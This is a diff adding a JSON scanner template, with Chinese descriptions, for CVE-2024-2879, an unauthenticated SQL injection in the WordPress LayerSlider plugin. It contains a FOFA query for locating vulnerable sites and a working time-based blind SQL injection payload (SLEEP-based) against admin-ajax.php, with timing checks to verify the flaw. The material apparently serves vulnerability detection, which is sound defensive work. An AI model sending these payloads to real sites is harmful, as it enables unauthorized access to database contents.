@@ -1,0 +1,63 @@
+{
+  "product": "WordPress",
+  "vul_name": "WordPress LayerSlider插件SQL注入",
+  "type": "SQL注入",
+  "vul_id": [
+    "CVE-2024-2879"
+  ],
+  "level": 3,
+  "vul_desc": "LayerSlider插件版本7.9.11 – 7.10.0中，由于对用户提供的参数转义不充分以及缺少wpdb::prepare()，可能导致通过 ls_get_popup_markup 操作受到SQL注入攻击，未经身份验证的威胁者可利用该漏洞从数据库中获取敏感信息。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"/wp-content/plugins/LayerSlider/\""
+  },
+  "protocol": "http",
+  "link": "https://nic.seu.edu.cn/info/1055/2275.htm",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "logic": "and",
+  "exploit": [
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)and+(SELECT+6416+FROM+(SELECT(SLEEP(8)))nEiK)--+vqlq"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "time": {
+              "check": ">=",
+              "num": 8
+            }
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)and+(SELECT+6416+FROM+(SELECT(SLEEP(0)))nEiK)--+vqlq"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "time": {
+              "check": "<=",
+              "num": 7
+            }
+          }
+        ]
+      }
+    }
+  ]
+}
